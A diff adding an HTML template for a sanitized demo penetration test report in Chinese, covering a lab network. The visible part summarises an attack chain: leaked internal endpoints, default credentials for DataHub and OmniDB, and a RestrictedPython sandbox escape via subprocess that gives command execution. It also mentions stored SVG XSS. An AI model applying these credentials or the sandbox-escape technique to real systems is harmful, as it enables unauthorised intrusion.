@@ -1,0 +1,1607 @@
+<!doctype html>
+<!-- atkbrain-report-source: demo-sanitized -->
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><!-- SLOT:title -->
+内网靶场示例 — 授权渗透测试交付报告（脱敏演示）
+<!-- /SLOT:title --></title>
+<style>
+:root{
+ --primary:#cc785c;
+ --primary-active:#a9583e;
+ --ink:#141413;
+ --body:#3d3d3a;
+ --body-strong:#252523;
+ --muted:#6c6a64;
+ --muted-soft:#8e8b82;
+ --hairline:#e6dfd8;
+ --hairline-soft:#ebe6df;
+ --canvas:#faf9f5;
+ --surface-soft:#f5f0e8;
+ --surface-card:#efe9de;
+ --surface-cream-strong:#e8e0d2;
+ --surface-dark:#181715;
+ --surface-dark-elevated:#252320;
+ --surface-dark-soft:#1f1e1b;
+ --on-dark:#faf9f5;
+ --on-dark-soft:#a09d96;
+ --accent-teal:#5db8a6;
+ --accent-amber:#e8a55a;
+ --success:#5db872;
+ --warning:#d4a017;
+ --error:#c64545;
+ --node-danger:#f08c2a;
+ --node-vuln:#c64545;
+ --node-goal:#ef3b3b;
+ --lateral:#6d5cf0;
+ --paper:var(--canvas);
+ --card:var(--surface-card);
+ --coral:var(--primary);
+ --coral-deep:var(--primary-active);
+ --hair:var(--hairline);
+ --crit:var(--error);
+ --high:var(--warning);
+ --med:var(--muted-soft);
+ --ok:var(--success);
+ --dark:var(--surface-dark);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--canvas);color:var(--body);font-family:"Noto Sans SC","Noto Sans CJK SC","PingFang SC","Microsoft YaHei",system-ui,sans-serif;font-size:15px;line-height:1.75}
+h1,h2,h3,h4,h5{color:var(--ink);font-family:inherit;line-height:1.35}
+a{color:var(--primary-active);text-decoration:none}
+a:hover{text-decoration:underline}
+code,pre,.mono{font-family:ui-monospace,SFMono-Regular,"Cascadia Mono","JetBrains Mono",Consolas,monospace}
+pre{background:var(--surface-dark);color:var(--on-dark);border-radius:12px;padding:16px 18px;overflow-x:auto;font-size:12.5px;line-height:1.6;white-space:pre;margin:10px 0}
+pre .c{color:var(--on-dark-soft)}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+/* ---------- 封面 ---------- */
+.cover{background:var(--surface-dark);color:var(--on-dark);padding:84px 0 64px;position:relative;overflow:hidden}
+.cover .grain{position:absolute;inset:0;background:
+ radial-gradient(900px 340px at 12% -10%,rgba(204,120,92,.16),transparent 60%),
+ radial-gradient(700px 300px at 95% 15%,rgba(93,184,166,.10),transparent 55%)}
+.cover .inner{position:relative;max-width:1180px;margin:0 auto;padding:0 28px}
+.cover .brand{display:flex;align-items:center;gap:10px;font-size:13px;letter-spacing:.14em;color:var(--on-dark-soft);text-transform:uppercase}
+.cover .brand .dot{width:10px;height:10px;border-radius:50%;background:var(--primary);display:inline-block}
+.cover .tag{margin-top:18px;display:inline-block;border:1px solid rgba(204,120,92,.5);color:var(--primary);border-radius:999px;padding:4px 16px;font-size:13px;letter-spacing:.08em}
+.cover h1{font-size:46px;font-weight:800;margin:26px 0 10px;color:var(--on-dark);letter-spacing:.02em}
+.cover h1 .accent{color:var(--primary)}
+.cover .sub{font-size:17px;color:var(--on-dark-soft);max-width:760px}
+.cover .meta{display:flex;flex-wrap:wrap;gap:12px;margin-top:34px}
+.cover .meta .m{background:var(--surface-dark-elevated);border:1px solid var(--surface-dark-soft);border-radius:12px;padding:10px 18px;font-size:13px;color:var(--on-dark-soft)}
+.cover .meta .m b{color:var(--on-dark);font-weight:600}
+.cover .rule{height:3px;background:linear-gradient(90deg,var(--primary) 0%,var(--primary) 34%,var(--accent-teal) 34%,var(--accent-teal) 66%,var(--accent-amber) 66%);width:100%;max-width:1180px;margin:0 auto;position:relative}
+.cover .goal-badge{margin-top:30px;display:inline-flex;align-items:center;gap:10px;background:var(--surface-dark-elevated);border:1px solid rgba(239,59,59,.45);border-radius:12px;padding:10px 20px;color:var(--on-dark)}
+.cover .goal-badge .flag{color:var(--node-goal);font-weight:700;font-size:14px}
+/* ---------- 区块 ---------- */
+section.sec{margin-top:64px}
+.sec-head{display:flex;align-items:baseline;gap:14px;border-bottom:2px solid var(--hairline);padding-bottom:12px;margin-bottom:28px}
+.sec-head .num{font-size:22px;font-weight:800;color:var(--primary)}
+.sec-head h2{font-size:26px;font-weight:800}
+.sec-head .en{color:var(--muted-soft);font-size:13px;letter-spacing:.1em;text-transform:uppercase}
+.sec-sub{color:var(--muted);font-size:14px;margin:-14px 0 22px}
+/* ---------- KPI ---------- */
+.kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.kpi{background:var(--surface-card);border:1px solid var(--hairline);border-radius:12px;padding:18px 20px;position:relative;overflow:hidden}
+.kpi .k-num{font-size:34px;font-weight:800;color:var(--ink);line-height:1.1}
+.kpi .k-num small{font-size:15px;font-weight:600;color:var(--muted)}
+.kpi .k-label{font-size:13px;color:var(--muted);margin-top:6px}
+.kpi .k-ico{position:absolute;right:14px;top:14px;font-size:20px;opacity:.55}
+.kpi.crit .k-num{color:var(--crit)}.kpi.high .k-num{color:var(--high)}.kpi.ok .k-num{color:var(--ok)}
+.kpi.goal{background:var(--surface-dark);border-color:var(--surface-dark)}
+.kpi.goal .k-num{color:var(--node-goal)}.kpi.goal .k-label{color:var(--on-dark-soft)}
+.kpi.teal .k-num{color:var(--accent-teal)}
+/* ---------- 图表 ---------- */
+.charts{display:grid;grid-template-columns:1.2fr 1fr;gap:20px}
+.chart-card{background:var(--surface-card);border:1px solid var(--hairline);border-radius:12px;padding:20px 22px}
+.chart-card h4{font-size:15px;margin-bottom:14px;color:var(--body-strong)}
+.chart-card .note{font-size:12.5px;color:var(--muted);margin-top:8px}
+/* ---------- 资产卡片 ---------- */
+.assets{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.asset{background:var(--surface-card);border:1px solid var(--hairline);border-radius:12px;padding:18px 20px;display:flex;flex-direction:column;gap:8px;box-shadow:0 6px 18px rgba(20,20,19,.04)}
+.asset.danger{}
+.asset.warn{}
+.asset .a-name{font-weight:700;color:var(--body-strong);font-size:15px;font-family:ui-monospace,Consolas,monospace}
+.asset .a-role{font-size:13px;color:var(--muted)}
+.asset .a-badges{display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-size:11.5px;border-radius:999px;padding:2px 10px;font-weight:600;border:1px solid var(--hairline);background:var(--surface-soft);color:var(--muted)}
+.chip.crit{background:rgba(198,69,69,.10);border-color:rgba(198,69,69,.35);color:var(--crit)}
+.chip.high{background:rgba(212,160,23,.12);border-color:rgba(212,160,23,.4);color:#a07c10}
+.chip.ok{background:rgba(93,184,114,.12);border-color:rgba(93,184,114,.4);color:#3e8f52}
+.chip.teal{background:rgba(93,184,166,.12);border-color:rgba(93,184,166,.4);color:#2f8575}
+.asset .a-desc{font-size:13px;color:var(--body)}
+.asset .a-line{font-size:12.5px;color:var(--muted);border-top:1px dashed var(--hairline);padding-top:8px}
+/* ---------- 漏洞卡片 ---------- */
+.vf{background:var(--surface-card);border:1px solid var(--hairline);border-radius:12px;margin-bottom:28px;overflow:hidden;position:relative}
+
+
+
+
+
+.vhead{padding:20px 24px 14px 24px;background:var(--surface-soft);border-bottom:1px solid var(--hairline-soft)}
+.vtitle-row{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.vtitle-row h3{font-size:18px;font-weight:800;flex:1;min-width:220px}
+.sev-chip{font-size:12px;font-weight:700;border-radius:6px;padding:3px 12px;color:#fff}
+.sev-chip.crit{background:var(--crit)}
+.sev-chip.high{background:var(--high)}
+.sev-chip.med{background:var(--muted-soft)}
+.sev-chip.low{background:var(--muted)}
+.vmeta{font-size:12.5px;color:var(--muted);margin-top:8px;display:flex;gap:14px;flex-wrap:wrap}
+.vbody{padding:6px 24px 20px 24px}
+.vsec{margin-top:18px}
+.vsec h4{font-size:14.5px;font-weight:700;display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.vsec h4 .tick{color:var(--primary);font-weight:800}
+.vsec h4 .tick.g{color:var(--ok)}
+.vsec h4 .tick.r{color:var(--crit)}
+.vsec p{font-size:14px;margin:8px 0;color:var(--body)}
+.vsec ol{margin:8px 0 8px 22px;font-size:14px;color:var(--body)}
+.vsec ol li{margin:6px 0}
+.fix-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:6px}
+.fix-box{background:var(--surface-soft);border:1px solid var(--hairline);border-radius:10px;padding:14px 16px}
+.fix-box h5{font-size:13px;margin-bottom:8px;display:flex;align-items:center;gap:7px}
+.fix-box h5.now{color:var(--warning)}
+.fix-box h5.root{color:var(--success)}
+.fix-box ul{margin-left:18px;font-size:13.5px;color:var(--body)}
+.fix-box li{margin:5px 0}
+details.ev{margin-top:16px;background:var(--canvas);border:1px solid var(--hairline);border-radius:10px}
+details.ev summary{cursor:pointer;padding:11px 16px;font-size:13.5px;font-weight:600;color:var(--primary-active);list-style:none}
+details.ev summary::before{content:"▸ ";color:var(--primary)}
+details.ev[open] summary::before{content:"▾ "}
+details.ev .ev-body{padding:4px 16px 14px;font-size:13px;color:var(--body)}
+details.ev .ev-body .row{margin:6px 0}
+details.ev .ev-body .k{color:var(--muted);font-size:12px;display:inline-block;min-width:86px}
+/* ---------- 汇总表 ---------- */
+table.tbl{width:100%;border-collapse:collapse;font-size:13.5px;background:var(--surface-card);border-radius:12px;overflow:hidden}
+.tbl th{background:var(--surface-dark);color:var(--on-dark);text-align:left;padding:10px 14px;font-size:12.5px;letter-spacing:.04em}
+.tbl td{padding:9px 14px;border-top:1px solid var(--hairline-soft);vertical-align:top}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,.35)}
+.tbl .s-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+@media(max-width:900px){.kpis{grid-template-columns:repeat(2,1fr)}.charts,.fix-grid,.grid2,.assets{grid-template-columns:1fr}.cover h1{font-size:34px}}
+
+
+/* ---------- 执行摘要双栏（图一样式） ---------- */
+.sum-grid{display:grid;grid-template-columns:1.15fr .95fr;gap:16px;margin-top:8px}
+@media(max-width:900px){.sum-grid{grid-template-columns:1fr}}
+.sum-card{background:var(--surface-card);border:1px solid var(--hairline);border-radius:14px;padding:20px 22px;box-shadow:0 6px 18px rgba(20,20,19,.04)}
+.sum-card h3{font-size:15px;font-weight:800;color:var(--ink);margin:0 0 12px;display:flex;align-items:center;gap:8px}
+.sum-card h3 .dot{width:8px;height:8px;border-radius:50%;background:var(--primary);display:inline-block}
+.sum-card p{font-size:13.5px;line-height:1.75;color:var(--body);margin:0 0 10px}
+.sum-card ul{margin:0;padding:0;list-style:none}
+.sum-card ul li{position:relative;padding:5px 0 5px 16px;font-size:13.5px;line-height:1.65;color:var(--body)}
+.sum-card ul li::before{content:"";position:absolute;left:0;top:13px;width:6px;height:6px;border-radius:50%;background:var(--primary);opacity:.75}
+.sum-card .concl{margin:0;padding:0;list-style:none}
+.sum-card .concl li{padding:8px 0;border-bottom:1px dashed var(--hairline-soft);font-size:13.5px;line-height:1.6;display:flex;gap:10px;align-items:flex-start}
+.sum-card .concl li:last-child{border-bottom:0}
+.sum-card .tag-sev{flex:0 0 auto;font-size:11px;font-weight:800;padding:2px 8px;border-radius:6px;margin-top:2px}
+.sum-card .tag-sev.crit{background:rgba(198,69,69,.12);color:var(--error)}
+.sum-card .tag-sev.high{background:rgba(212,160,23,.14);color:#a07c10}
+.sum-card .tag-sev.med{background:rgba(142,139,130,.14);color:var(--muted)}
+.sum-foot{margin-top:14px;font-size:12.5px;color:var(--muted);line-height:1.7;background:var(--surface-soft);border:1px solid var(--hairline);border-radius:12px;padding:12px 16px}
+/* 验证图例放 SVG 外，避免裁切 */
+.verify-panel{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+.verify-panel svg{flex:0 0 auto;max-width:220px}
+.verify-legend{flex:1;min-width:180px;display:flex;flex-direction:column;gap:10px}
+.verify-legend .row{display:flex;align-items:center;gap:10px;font-size:13.5px;color:var(--body)}
+.verify-legend i{width:12px;height:12px;border-radius:3px;flex:0 0 auto}
+.verify-legend b{color:var(--ink);margin-left:4px}
+
+/* ---------- 关键攻击路径（紧凑） ---------- */
+.path-board{background:var(--surface-soft);border:1px solid var(--hairline);border-radius:14px;padding:18px 16px 14px;margin-top:8px}
+.path-rows{display:flex;flex-direction:column;gap:8px}
+.path-row{display:flex;align-items:stretch;justify-content:center;gap:0;flex-wrap:nowrap}
+.pn{background:#fffdf8;border:1.5px solid var(--hairline);border-radius:10px;padding:10px 12px;width:210px;min-width:190px;max-width:210px;flex:0 0 210px;box-shadow:0 3px 10px rgba(20,20,19,.04);position:relative}
+.pn .pk{font-size:10px;font-weight:800;letter-spacing:.04em;text-transform:lowercase;margin-bottom:2px}
+.pn .pt{font-size:12.5px;font-weight:700;color:var(--ink);line-height:1.3;margin-bottom:2px}
+.pn .pd{font-size:11px;color:var(--muted);line-height:1.4}
+.pn.info{border-color:rgba(93,184,166,.55)}.pn.info .pk{color:var(--accent-teal)}
+.pn.warn{border-color:rgba(232,165,90,.65)}.pn.warn .pk{color:#c4842a}
+.pn.crit{border-color:rgba(198,69,69,.55)}.pn.crit .pk{color:var(--error)}
+.pn.goal{background:var(--error);border-color:var(--error);color:#fff;box-shadow:0 6px 16px rgba(198,69,69,.26)}
+.pn.goal .pk{color:#ffd0d0}.pn.goal .pt{color:#fff}.pn.goal .pd{color:rgba(255,255,255,.88)}
+.parrow{display:flex;align-items:center;justify-content:center;width:64px;min-width:64px;padding:0 4px;color:var(--muted);font-size:10px;font-weight:600;flex-direction:column;gap:2px;flex:0 0 64px;text-align:center;line-height:1.25}
+.parrow .line{width:100%;height:2px;background:linear-gradient(90deg,var(--hairline),var(--primary),var(--hairline));border-radius:2px;position:relative}
+.parrow .line::after{content:"";position:absolute;right:-1px;top:50%;transform:translateY(-50%);border:4px solid transparent;border-left-color:var(--primary)}
+.parrow .arr{display:none}
+.parrow.down{width:100%;min-width:0;padding:4px 0;flex-direction:column;gap:3px;align-items:center}
+.parrow.down .line{width:2px;height:22px;background:linear-gradient(180deg,var(--hairline),var(--primary));border-radius:2px}
+.parrow.down .line::after{right:auto;left:50%;top:auto;bottom:-1px;transform:translateX(-50%);border:4px solid transparent;border-top-color:var(--primary);border-left-color:transparent}
+.path-legend{display:flex;flex-wrap:wrap;gap:10px 14px;margin-top:12px;padding-top:10px;border-top:1px dashed var(--hairline);font-size:11.5px;color:var(--muted)}
+.path-legend i{display:inline-block;width:9px;height:9px;border-radius:3px;margin-right:5px;vertical-align:-1px}
+.path-legend .l-crit{background:var(--error)}
+.path-legend .l-warn{background:#e8a55a}
+.path-legend .l-info{background:var(--accent-teal)}
+.path-legend .l-goal{background:var(--node-goal)}
+.path-caption{margin-top:12px;font-size:13px;color:var(--body);line-height:1.65;background:#fffdf8;border:1px solid var(--hairline);border-radius:10px;padding:12px 14px}
+@media(max-width:980px){
+ .path-row{flex-wrap:wrap;justify-content:flex-start}
+ .parrow{width:48px;min-width:48px;flex-basis:48px}
+ .pn{flex:1 1 180px;max-width:none;width:auto}
+}
+
+
+
+
+/* ---------- 资产关系图 ---------- */
+.asset-map{background:var(--surface-soft);border:1px solid var(--hairline);border-radius:16px;padding:24px 22px 18px;margin:8px 0 22px;box-shadow:0 6px 18px rgba(20,20,19,.04)}
+.asset-map h4{font-size:14px;font-weight:800;color:var(--body-strong);margin:0 0 6px}
+.asset-map .am-sub{font-size:12.5px;color:var(--muted);margin:0 0 14px;line-height:1.55;max-width:900px}
+.asset-map svg{width:100%;height:auto;display:block;background:#fffdf8;border:1px solid var(--hairline);border-radius:14px}
+.asset-map .am-legend{display:flex;flex-wrap:wrap;gap:12px 18px;margin-top:12px;font-size:12px;color:var(--muted)}
+.asset-map .am-legend i{display:inline-block;width:10px;height:10px;border-radius:3px;margin-right:6px;vertical-align:-1px}
+.am-svc-list{margin-top:14px;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px 16px}
+@media(max-width:800px){.am-svc-list{grid-template-columns:1fr}}
+.am-svc-list .am-item{background:#fffdf8;border:1px solid var(--hairline);border-radius:10px;padding:8px 12px;font-size:12.5px;line-height:1.45;color:var(--body)}
+.am-svc-list .am-item b{color:var(--ink);font-weight:700}
+.am-svc-list .am-item.hot{border-color:rgba(198,69,69,.45);background:rgba(198,69,69,.05)}
+.am-svc-list .am-item .k{color:var(--muted);font-size:11px}
+
+/* ---------- PDF / WeasyPrint ---------- */
+@page{size:A4;margin:14mm 12mm 16mm 12mm}
+@media print{
+ body{background:#fff;font-size:12.5px}
+ .cover{padding:48px 0 36px;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+ .cover h1{font-size:32px}
+ section.sec{margin-top:36px;break-before:auto}
+ .sec-head{break-after:avoid}
+ .vf{break-inside:avoid;margin-bottom:18px}
+ .vhead{break-after:avoid}
+ .kpi,.pn,.asset,.sum-card,.chart-card{break-inside:avoid}
+ .path-board,.asset-map{break-inside:avoid}
+ footer{break-before:avoid}
+ a{color:inherit;text-decoration:none}
+}
+/* WeasyPrint also honors some print rules outside @media */
+.vf{break-inside:avoid}
+.vhead{break-after:avoid}
+.sec-head{break-after:avoid}
+
+</style>
+</head><body data-demo-sanitized="1">
+<div style="background:#181715;color:#faf9f5;text-align:center;padding:10px 16px;font-size:13px;letter-spacing:.04em">演示报告 · 内网靶场示例 · 已脱敏，不含真实单位 / 地址 / 账号</div>
+<header class="cover"><div class="grain"></div><div class="inner">
+<div class="brand"><span class="dot"></span>授权渗透测试交付报告</div>
+<span class="tag">
+<!-- SLOT:cover-meta -->
+AUTHORIZED PENTEST · 2026-08-31</span>
+<h1>内网靶场 · 示例环境<br><span class="accent">多目标渗透测试报告</span></h1>
+<p class="sub">以 portal.lab.internal 为入口，沿信息泄露链扩权至 DataHub 数据中台，最终经 OmniDB 3.0.3b 默认口令与 RestrictedPython 沙箱缺陷达成 <b style="color:var(--node-goal)">容器内命令执行（已获取服务器权限）</b>。本报告含 23 项发现（严重 5 / 高危 8），附完整证据、PoC 与修复方案。</p>
+<div class="meta">
+<div class="m"><b>入口目标</b> · portal.lab.internal</div>
+<div class="m"><b>测试性质</b> · 授权渗透测试（仅限授权环境）</div>
+<div class="m"><b>验证结论</b> · 19 项已验证 · 权限已落地</div>
+<div class="m"><b>攻击图</b> · 118 节点 / 220 边 / 22 服务</div>
+</div>
+<div class="goal-badge"><span class="flag">权限已获取</span><span style="color:var(--on-dark-soft)">服务器权限 (omnidb) @ 10.10.20.40 — canary 已写入并经 HTTP 取回，复验通过</span></div>
+<!-- /SLOT:cover-meta -->
+</div></header>
+<div class="rule"></div>
+<main class="wrap">
+<section class="sec" id="summary">
+<div class="sec-head"><span class="num">01</span><h2>执行摘要</h2><span class="en">Executive Summary</span></div>
+
+<!-- SLOT:summary -->
+<div class="sum-grid">
+ <div class="sum-card">
+ <h3><span class="dot"></span>测试概况与结论</h3>
+ <p>对授权目标 <code>portal.lab.internal</code>（示例内网靶场）及其解析出的同机服务面开展授权渗透测试。攻击路径从公开静态站的情报泄露切入，扩展到数据侧同机服务群，最终在 OmniDB 数据库管理工具上完成权限落地：</p>
+ <ul>
+ <li>公开 JS 泄露 若干成员邮箱与 12 个内部平台入口清单（roster.js / portals.js）；</li>
+ <li>DataHub 数据中台默认口令 <code>admin / lab-default</code> 进入超级管理员；</li>
+ <li>前端泄露数据库工具端点 → 定位 OmniDB <code>10.10.20.40:8999</code>；</li>
+ <li>OmniDB 默认口令 <code>admin / admin</code> 进入后台；</li>
+ <li>监控脚本沙箱逃逸（RestrictedPython 仅拦截 <code>os</code>）→ <code>import subprocess</code> 执行系统命令，<b style="color:var(--node-goal)">已获取服务器权限</b>（canary 写入并经 HTTP 匿名取回证实）。</li>
+ </ul>
+ </div>
+ <div class="sum-card">
+ <h3><span class="dot"></span>关键结论</h3>
+ <ul class="concl">
+ <li><span class="tag-sev crit">严重</span><span>OmniDB 监控脚本沙箱逃逸实现远程命令执行，服务器权限已到手（omnidb 用户，canary 复验通过）；</span></li>
+ <li><span class="tag-sev crit">严重</span><span>DataHub 默认口令 + Regular 垂直越权（可删管理员、建超管），数据中台可被完全接管；</span></li>
+ <li><span class="tag-sev high">高危</span><span>上传目录未授权读写（视频 / HDF5 / 任意文件）+ 存储型 SVG XSS，构成「写入 → 公开读取 → 会话窃取」链；</span></li>
+ <li><span class="tag-sev high">高危</span><span>AnnoApp 源码 / Docker 镜像归档泄露（26.9MB tar 完整下载、哈希一致），GitLab 开放注册；</span></li>
+ <li><span class="tag-sev med">中危</span><span>静态站 JS 泄露内部平台端点清单与成员邮箱，MinIO 服务面公网暴露（Access Key 存在、secret 未破）。</span></li>
+ </ul>
+ <p style="margin-top:12px;font-size:13px;color:var(--body-strong)">整体风险评级：<b style="color:var(--error)">严重</b>。建议按「修复优先级汇总」P0 项立即处置。</p>
+ </div>
+</div>
+<div class="sum-foot"><b>验证说明：</b>全部验证以最小影响方式执行（短 canary 文件、临时测试账号），未改动任何业务数据、未写入业务数据库；测试产生的探测账号、测试角色与文件均已在验证完成后回滚 / 删除（DataHub 测试账号与角色已删除、被覆盖的管理员已重建、canary 文件已清理）。攻击行为仅针对授权范围内资产。漏洞严重度按 CVSS 语义与通行实践分级：严重 = 可直接导致权限失陷或平台接管；高危 = 可直接导致数据泄露或构成命令执行前置面；中低危 = 信息泄露与配置类风险。</div>
+<!-- /SLOT:summary -->
+
+<!-- SLOT:kpis -->
+<div class="kpis" style="margin-top:22px">
+<div class="kpi"><div class="k-ico">🧾</div><div class="k-num">23</div><div class="k-label">漏洞发现总数</div></div>
+<div class="kpi crit"><div class="k-ico">🔥</div><div class="k-num">5</div><div class="k-label">严重 Critical</div></div>
+<div class="kpi high"><div class="k-ico">⚠️</div><div class="k-num">8</div><div class="k-label">高危 High</div></div>
+<div class="kpi med"><div class="k-ico">📄</div><div class="k-num">8 / 2</div><div class="k-label">中危 / 低危</div></div>
+<div class="kpi teal"><div class="k-ico">🖥️</div><div class="k-num">22</div><div class="k-label">服务节点</div></div>
+<div class="kpi"><div class="k-ico">✅</div><div class="k-num">19</div><div class="k-label">已验证</div></div>
+<div class="kpi goal"><div class="k-ico">🏁</div><div class="k-num">1</div><div class="k-label">已获取权限（OmniDB 容器）</div></div>
+<div class="kpi"><div class="k-ico">🎯</div><div class="k-num">P0</div><div class="k-label">建议立即整改项</div></div>
+</div>
+<!-- /SLOT:kpis -->
+</section>
+<section class="sec" id="stats">
+<div class="sec-head"><span class="num">02</span><h2>漏洞统计分布</h2><span class="en">Severity &amp; Verification</span></div>
+
+<!-- SLOT:charts -->
+<div class="charts">
+<div class="chart-card"><h4>严重度分布（23 项发现）</h4><svg viewBox="0 0 640 190" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto" role="img" aria-label="漏洞严重度分布">
+<text x="0" y="32" font-size="13" fill="var(--body)" font-family="inherit">严重 critical</text>
+<rect x="150" y="16" width="420" height="20" rx="10" fill="var(--surface-soft)" stroke="var(--hairline)"/>
+<rect x="150" y="16" width="91" height="20" rx="10" fill="var(--crit)"><title>5 条</title></rect>
+<text x="255" y="31" font-size="14" font-weight="700" fill="var(--ink)">5</text>
+<text x="0" y="72" font-size="13" fill="var(--body)" font-family="inherit">高危 high</text>
+<rect x="150" y="56" width="420" height="20" rx="10" fill="var(--surface-soft)" stroke="var(--hairline)"/>
+<rect x="150" y="56" width="146" height="20" rx="10" fill="var(--high)"><title>8 条</title></rect>
+<text x="310" y="71" font-size="14" font-weight="700" fill="var(--ink)">8</text>
+<text x="0" y="112" font-size="13" fill="var(--body)" font-family="inherit">中危 medium</text>
+<rect x="150" y="96" width="420" height="20" rx="10" fill="var(--surface-soft)" stroke="var(--hairline)"/>
+<rect x="150" y="96" width="146" height="20" rx="10" fill="var(--muted-soft)"><title>8 条</title></rect>
+<text x="310" y="111" font-size="14" font-weight="700" fill="var(--ink)">8</text>
+<text x="0" y="152" font-size="13" fill="var(--body)" font-family="inherit">低危 low</text>
+<rect x="150" y="136" width="420" height="20" rx="10" fill="var(--surface-soft)" stroke="var(--hairline)"/>
+<rect x="150" y="136" width="37" height="20" rx="10" fill="var(--muted)"><title>2 条</title></rect>
+<text x="201" y="151" font-size="14" font-weight="700" fill="var(--ink)">2</text>
+</svg><div class="note">严重/高危合计 13 项，占 57% —— 其中 5 项严重全部与「默认口令 / 弱口令 + 缺失服务端鉴权 / 沙箱缺陷」直接相关，属可预防的基线类问题。</div></div>
+<div class="chart-card"><h4>验证状态分布</h4>
+<div class="verify-panel">
+<svg viewBox="0 0 220 200" width="200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="验证状态分布">
+<path d="M 110 26 A 74 74 0 1 1 44.3 66.0" fill="none" stroke="var(--success)" stroke-width="24"/>
+<path d="M 44.3 66.0 A 74 74 0 0 1 55.9 49.5" fill="none" stroke="var(--warning)" stroke-width="24"/>
+<path d="M 55.9 49.5 A 74 74 0 0 1 110 26" fill="none" stroke="var(--muted-soft)" stroke-width="24"/>
+<text x="110" y="104" text-anchor="middle" font-size="30" font-weight="800" fill="var(--ink)">23</text>
+<text x="110" y="126" text-anchor="middle" font-size="12" fill="var(--muted)">漏洞总数</text>
+</svg>
+<div class="verify-legend">
+ <div class="row"><i style="background:var(--success)"></i>已验证 <b>19</b></div>
+ <div class="row"><i style="background:var(--warning)"></i>待复验 <b>1</b></div>
+ <div class="row"><i style="background:var(--muted-soft)"></i>节点级记录 <b>3</b></div>
+</div>
+</div>
+<div class="note">19 项已完成验证；AnnoApp Docker 镜像泄露 1 项标为待复验（复验响应未含约定 canary，本地完整下载与哈希校验一致）；另有 3 项为节点级情报记录。</div></div>
+</div>
+<!-- /SLOT:charts -->
+</section>
+<section class="sec" id="path">
+<div class="sec-head"><span class="num">03</span><h2>关键攻击路径</h2><span class="en">Attack Path</span></div>
+
+<!-- SLOT:path -->
+<p class="sec-sub">从公开静态站情报，经同机服务群进入 DataHub 数据中台，再借前端泄露的数据库工具端点抵达 OmniDB，最终以「默认口令 + 监控沙箱逃逸」完成权限落地。</p>
+<div class="path-board">
+ <div class="path-rows">
+ <div class="path-row">
+ <div class="pn info"><div class="pk">info</div><div class="pt">portal.lab.internal 静态展示站</div><div class="pd">公开 JS 泄露内部邮箱清单 + 内部平台清单</div></div>
+ <div class="parrow"><span class="line"></span><span>JS 情报</span></div>
+ <div class="pn warn"><div class="pk">warn</div><div class="pt">情报扩展 · 同机服务群</div><div class="pd">sdc / food / GitLab / GitLab / AnnoApp / MinIO</div></div>
+ <div class="parrow"><span class="line"></span><span>同机服务群</span></div>
+ <div class="pn info"><div class="pk">info</div><div class="pt">DataHub 数据中台</div><div class="pd">data.lab.internal · 动态 API 后台</div></div>
+ </div>
+ <div class="parrow down"><span class="line"></span><span>进入数据侧</span></div>
+ <div class="path-row">
+ <div class="pn crit"><div class="pk">crit</div><div class="pt">DataHub 默认口令 admin / lab-default</div><div class="pd">验证码 SVG 明文 → SuperAdmin 会话</div></div>
+ <div class="parrow"><span class="line"></span><span>弱口令</span></div>
+ <div class="pn warn"><div class="pk">warn</div><div class="pt">前端泄露数据库工具端点</div><div class="pd">SqlPad · OmniDB · TDengine 端口清单</div></div>
+ <div class="parrow"><span class="line"></span><span>端点暴露</span></div>
+ <div class="pn info"><div class="pk">info</div><div class="pt">OmniDB 3.0.3b @:8999</div><div class="pd">10.10.20.40 · 公网可达</div></div>
+ </div>
+ <div class="parrow down"><span class="line"></span><span>默认口令</span></div>
+ <div class="path-row">
+ <div class="pn crit"><div class="pk">crit</div><div class="pt">OmniDB 默认口令 admin / admin</div><div class="pd">进入后台工作台 /workspace/</div></div>
+ <div class="parrow"><span class="line"></span><span>后台会话</span></div>
+ <div class="pn crit"><div class="pk">crit</div><div class="pt">Monitoring 沙箱逃逸</div><div class="pd">RestrictedPython 仅拦 os → import subprocess</div></div>
+ <div class="parrow"><span class="line"></span><span>沙箱逃逸 → RCE</span></div>
+ <div class="pn goal"><div class="pk">goal</div><div class="pt">已获取服务器权限</div><div class="pd">omnidb 用户 · canary 写入并 HTTP 取回</div></div>
+ </div>
+ </div>
+ <div class="path-legend">
+ <span><i class="l-crit"></i>关键缺陷节点</span>
+ <span><i class="l-warn"></i>过渡 / 扩展节点</span>
+ <span><i class="l-info"></i>情报与服务节点</span>
+ <span><i class="l-goal"></i>权限落地目标</span>
+ </div>
+</div>
+<div class="path-caption">路径起点为公开静态站的可读 JS 情报，经同机服务群扩展进入 DataHub 数据中台，再借前端泄露的数据库工具端点抵达 OmniDB，最终以「默认口令 + 监控沙箱逃逸」完成权限落地。整条链无需任何业务数据凭据。</div>
+
+<!-- /SLOT:path -->
+</section>
+<section class="sec" id="assets">
+<div class="sec-head"><span class="num">04</span><h2>资产画像</h2><span class="en">Assets in Scope</span></div>
+
+<!-- SLOT:assets -->
+<p class="sec-sub">授权范围（strict 模式）：portal / datahub / docs / git.lab.internal 域名及 7 个 IP 段内主机；以下为主要测绘对象。</p>
+
+
+
+<div class="asset-map">
+  <h4>资产关系图</h4>
+  <p class="am-sub">曲线连接保留情报扩线观感；拓扑展示独立资产面，下方清单收录全部 <b>22</b> 条服务节点（含重复探测记录），互不遮挡。</p>
+  <svg viewBox="0 0 1120 640" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="资产关系图">
+    <defs>
+      <marker id="am-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+        <path d="M 0 1 L 9 5 L 0 9 z" fill="#cc785c"/>
+      </marker>
